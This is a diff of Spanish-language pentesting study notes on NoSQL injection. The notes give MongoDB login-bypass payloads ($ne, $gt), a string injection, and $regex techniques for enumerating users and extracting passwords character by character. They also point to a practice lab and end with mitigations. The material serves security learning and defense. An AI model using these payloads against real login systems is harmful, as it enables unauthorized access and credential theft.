@@ -1,122 +1,119 @@
+# NoSQL Injection (NoSQLi)
+
+La inyección NoSQL afecta a aplicaciones que usan bases de datos no relacionales como **MongoDB**, **CouchDB**, **Cassandra** o **FirebaseDB**. En lugar de manipular consultas SQL, se explotan los operadores y la estructura de consultas propios de estas bases de datos.
+
+Bases de datos afectadas más comunes: `MongoDB`, `CouchDB`, `Cassandra`, `FirebaseDB`.
+
 ---
-tags:
-  - Web
-  - Explotacion
-  - NoSQL
----
-
-
-# Notas
-
-Esta vulnerabilidad se presentan en las webs que tienen las base de datos NoSQL.
-Algunas bases de datos de este tipo son `MongoDB`, `Cassandra`, `CouchDB` y `FirebaseDB`.
-
-En al pagina de PayloadsAllTheThings podemos buscar diferentes payloads para utilizar
-https://github.com/swisskyrepo/PayloadsAllTheThings
 
 ## Authentication Bypass
 
-Interceptamos la petición con Burp Suite o Caido y lo pasamos al repiter o replay.
+### Caso base — petición normal de login (JSON)
 
-**PETICIÓN:**
 ```http
 POST /user/login HTTP/1.1
-Host: localhost:4000
-User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
-Accept: application/json, text/javascript, */*; q=0.01
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate, br, zstd
-Referer: http://localhost:4000/user/login
+Host: target.com
 Content-Type: application/json
-X-Requested-With: XMLHttpRequest
-Content-Length: 39
-Origin: http://localhost:4000
-DNT: 1
-Connection: keep-alive
-Cookie: wp-settings-time-1=1744452991
-Sec-Fetch-Dest: empty
-Sec-Fetch-Mode: cors
-Sec-Fetch-Site: same-origin
-Priority: u=0
 
 {"username":"admin","password":"12345"}
 ```
 
+### Bypass con operadores de MongoDB
 
-**LOGUEARSE SABIENDO EL USUARIO**
+Si el servidor no sanitiza correctamente los operadores de consulta, se puede alterar la lógica:
 
-Nosotros sabemos el usuario, pero no sabemos la contraseña.
-Para ello podemos poner condiciones de la siguiente manera:
-```http
-POST /user/login HTTP/1.1
-...
-
-{"username":"admin","password":{"$ne":"123456"}}
+```json
+{"username": "admin", "password": {"$ne": "valorincorrecto"}}
 ```
 
-Otras opciones para explotar el login:
+`$ne` significa "not equal" — la condición es siempre verdadera si la contraseña real no es `valorincorrecto`. El login se completa sin conocer la contraseña real.
 
+**Otras variantes:**
 ```json
 {"username": {"$ne": null}, "password": {"$ne": null}}
 {"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
+{"username": {"$gt": ""}, "password": {"$gt": ""}}
 {"username": {"$gt": undefined}, "password": {"$gt": undefined}}
-{"username": {"$gt":""}, "password": {"$gt":""}}
 ```
 
+### Inyección clásica en MongoDB (cadena de texto)
 
-Otra manera es mediante expresión regular, con esto nos permite realizar fuerza bruta con Burp o Caido.
-
-```json
-{"username":"admin","password":{"$regex":"^a"}}
-```
-
-`Se puede crear un script que por fuerza bruta nos saque la contraseña`
-
-https://github.com/lBENDUl/NoSQLI_Discovery
-
-**BUSQUEDA DE USUARIOS**
-
-Si queremos buscar usuarios podemos aplicar expresiones regulares de la siguiente manera:
-
-```json
-{"username":{"$regex":"^a"},"password":{"$ne":"123456"}}
-```
-
-`Podemos ir probando, incluso realizar ataque de fuerza bruta con Burp o Caido para buscar nuevos usuarios`.
-
-## Visualización de datos
-
-En el caso de que veamos una entrada que dependiendo de lo que pongamos nos muestra un usuario o datos.
-
-Lo que se puede realizar es cambiar la petición que se envía de GET a POST
-Cambiar el `Content-Type` a `application/json` y en la data meter datos formato JSON.
-
-Aquí podemos vulnerarlo también con inyección.
-
---- 
-
-En **MONGO DB** hay una inyección común para ver todas las entradas, es la siguiente:
-
+En campos de texto plano que se concatenan a la consulta:
 ```
 admin'||'1'=='1
 ```
 
+---
 
+## Enumeración de usuarios con expresiones regulares
 
-# Hack4u
+MongoDB soporta `$regex`, lo que permite hacer fuerza bruta carácter a carácter:
 
-Las **inyecciones NoSQL** son una vulnerabilidad de seguridad en las aplicaciones web que utilizan bases de datos NoSQL, como MongoDB, Cassandra y CouchDB, entre otras. Estas inyecciones se producen cuando una aplicación web permite que un atacante envíe datos maliciosos a través de una consulta a la base de datos, que luego puede ser ejecutada por la aplicación sin la debida validación o sanitización.
+```json
+{"username": {"$regex": "^a"}, "password": {"$ne": "x"}}
+```
 
-La inyección NoSQL funciona de manera similar a la inyección SQL, pero se enfoca en las vulnerabilidades específicas de las bases de datos NoSQL. En una inyección NoSQL, el atacante aprovecha las consultas de la base de datos que se basan en **documentos** en lugar de tablas relacionales, para enviar datos maliciosos que pueden manipular la consulta de la base de datos y obtener información confidencial o realizar acciones no autorizadas.
+Si la respuesta es positiva, hay un usuario cuyo nombre empieza por `a`. Se va refinando:
+```json
+{"username": {"$regex": "^ad"}, "password": {"$ne": "x"}}
+{"username": {"$regex": "^adm"}, "password": {"$ne": "x"}}
+```
 
-A diferencia de las inyecciones SQL, las inyecciones NoSQL explotan la falta de validación de los datos en una consulta a la base de datos NoSQL, en lugar de explotar las debilidades de las consultas SQL en las **bases de datos relacionales**.
+Esto puede automatizarse con un script o con el intruder de Burp Suite / Caido.
 
-A continuación, se proporciona el enlace al proyecto de Github que nos descargamos para poner en práctica esta vulnerabilidad:
+Script de referencia para automatizar la enumeración:
+- [https://github.com/lBENDUl/NoSQLI_Discovery](https://github.com/lBENDUl/NoSQLI_Discovery)
 
-- **Vulnerable-Node-App**: [https://github.com/Charlie-belmer/vulnerable-node-app](https://github.com/Charlie-belmer/vulnerable-node-app)
+---
 
-# Laboratorios
+## Extracción de contraseñas con $regex
 
-A continuación, se proporciona el enlace al proyecto de Github que nos descargamos para poner en práctica esta vulnerabilidad:
+De la misma forma, se puede extraer la contraseña carácter a carácter:
 
-- **Vulnerable-Node-App**: [https://github.com/Charlie-belmer/vulnerable-node-app](https://github.com/Charlie-belmer/vulnerable-node-app)
+```json
+{"username": "admin", "password": {"$regex": "^a"}}
+{"username": "admin", "password": {"$regex": "^ab"}}
+```
+
+---
+
+## Cambiar método GET → POST para explotar parámetros
+
+Si la aplicación usa una petición GET con parámetros de búsqueda:
+```
+GET /api/users?username=admin
+```
+
+Intentar convertirla a POST con `Content-Type: application/json` y añadir los operadores en el cuerpo JSON. Algunos frameworks procesan ambos formatos.
+
+---
+
+## Diferencias con SQL Injection
+
+| Aspecto | SQLi | NoSQLi |
+|---|---|---|
+| Base de datos objetivo | Relacionales (MySQL, MSSQL, Oracle...) | No relacionales (MongoDB, Couch...) |
+| Estructura explotada | Sintaxis SQL | Operadores de consulta (ej. `$ne`, `$gt`, `$regex`) |
+| Payload típico | `' OR '1'='1` | `{"$ne": null}` |
+| Herramienta de referencia | SQLMap | NoSQLMap, scripts personalizados |
+
+---
+
+## Recursos y payloads adicionales
+
+- [PayloadsAllTheThings — NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
+
+---
+
+## Laboratorio para practicar
+
+- **Vulnerable-Node-App**: [https://github.com/Charlie-belmer/vulnerable-node-app](https://github.com/Charlie-belmer/vulnerable-node-app)
+
+---
+
+## Mitigaciones
+
+- Validar y rechazar operadores de MongoDB en el input del usuario (filtrar `$ne`, `$gt`, `$regex`, etc.)
+- Usar ORMs que parametricen las consultas automáticamente
+- Deshabilitar operadores JavaScript en MongoDB (`$where`, `mapReduce`) si no son necesarios
+- Principio de mínimo privilegio en la cuenta de base de datos
